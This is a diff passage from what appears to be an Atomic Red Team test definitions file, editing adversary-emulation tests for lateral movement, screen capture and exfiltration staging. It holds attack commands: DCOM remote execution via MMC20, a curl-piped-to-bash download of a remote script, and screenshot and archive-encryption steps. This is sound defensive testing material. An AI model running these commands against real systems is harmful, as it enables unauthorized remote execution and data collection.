+      - description: Check if netstat command exists on the machine
+        prereq_command: if [ -x "$(command -v netstat)" ]; then exit 0; else exit
+          1;
+        get_prereq_command: echo "Install netstat on the machine."; exit 1;
       executor:
         name: sh
         elevation_required: false
@@ -26034,7 +26425,7 @@ execution:
           default: computer1
       executor:
         name: powershell
-        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -27558,7 +27949,7 @@ lateral-movement:
           default: computer1
       executor:
         name: powershell
-        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -27965,10 +28356,15 @@ collection:
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        output_file:
+          description: Location to save downloaded discovery.bat file
+          type: Path
+          default: "/tmp/T1074_discovery.log"
       executor:
         name: bash
         command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
-          | bash -s > /tmp/discovery.log
+          | bash -s > #{output_file}
 
 '
     - name: Zip a Folder with PowerShell for Staging in Temp
@@ -28356,11 +28752,14 @@ collection:
         output_file:
           description: Output file path
           type: Path
-          default: desktop.png
+          default: "/tmp/T1113_desktop.png"
       executor:
         name: bash
         elevation_required: false
         command: 'screencapture #{output_file}
+
+'
+        cleanup_command: 'rm #{output_file}
 
 '
     - name: Screencapture (silent)
@@ -28373,11 +28772,14 @@ collection:
         output_file:
           description: Output file path
           type: Path
-          default: desktop.png
+          default: "/tmp/T1113_desktop.png"
       executor:
         name: bash
         elevation_required: false
         command: 'screencapture -x #{output_file}
+
+'
+        cleanup_command: 'rm #{output_file}
 
 '
     - name: X Windows Capture
@@ -28391,12 +28793,15 @@ collection:
         output_file:
           description: Output file path
           type: Path
-          default: desktop.xwd
+          default: "/tmp/T1113_desktop.xwd"
       executor:
         name: bash
         command: |
           xwd -root -out #{output_file}
           xwud -in #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
     - name: Import
       description: 'Use import command to collect a full desktop screenshot
 
@@ -28407,10 +28812,13 @@ collection:
         output_file:
           description: Output file path
           type: Path
-          default: desktop.png
+          default: "/tmp/T1113_desktop.png"
       executor:
         name: bash
         command: 'import -window root #{output_file}
+
+'
+        cleanup_command: 'rm #{output_file}
 
 '
 exfiltration:
@@ -28736,21 +29144,35 @@ exfiltration:
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        test_folder:
+          description: Path used to store files.
+          type: Path
+          default: "/tmp/T1022"
+        test_file:
+          description: Temp file used to store encrypted data.
+          type: Path
+          default: T1022
+        encryption_password:
+          description: Password used to encrypt data.
+          type: string
+          default: InsertPasswordHere
+      dependency_executor_name: sh
+      dependencies:
+      - description: gpg and zip are required to run the test.
+        prereq_command: if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)"
+          ]; then exit 1; fi;
+        get_prereq_command: echo "Install gpg and zip to run the test"; exit 1;
       executor:
         name: sh
         elevation_required: false
-        prereq_command: which gpg
         command: |
-          mkdir /tmp/victim-files
-          cd /tmp/victim-files
-          touch a b c d e f g
-          echo "creating zip with password 'insert password here'"
-          zip --password "insert password here" ./victim-files.zip ./*
-          echo "encrypting file with gpg, you will need to provide a password"
-          gpg -c /tmp/victim-files/victim-filex.zip
-          #<enter passphrase and confirm>
-          ls -l
-        cleanup_command: 'rm -Rf /tmp/victim-files
+          mkdir -p #{test_folder}
+          cd #{test_folder}; touch a b c d e f g
+          zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*
+          echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
+          ls -l #{test_folder}
+        cleanup_command: 'rm -Rf #{test_folder}
 
 '
     - name: Compress Data and lock with password for Exfiltration with winrar
@@ -28874,14 +29296,33 @@ exfiltration:
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        folder_path:
+          description: Path where the test creates artifacts
+          type: Path
+          default: "/tmp/T1030"
+        file_name:
+          description: File name
+          type: Path
+          default: T1030_urandom
+      dependency_executor_name: sh
+      dependencies:
+      - description: The file must exist for the test to run.
+        prereq_command: 'if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else
+          exit 0; fi;'
+        get_prereq_command: "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
+          touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name}
+          bs=25000000 count=1"
       executor:
         name: sh
         elevation_required: false
         command: |
-          cd /tmp/
-          dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
-          split -b 5000000 /tmp/victim-whole-file
-          ls -l
+          cd #{folder_path}; split -b 5000000 #{file_name}
+          ls -l #{folder_path}
+        cleanup_command: 'if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path};
+          fi;
+
+'
   T1048:
     technique:
       x_mitre_data_sources:
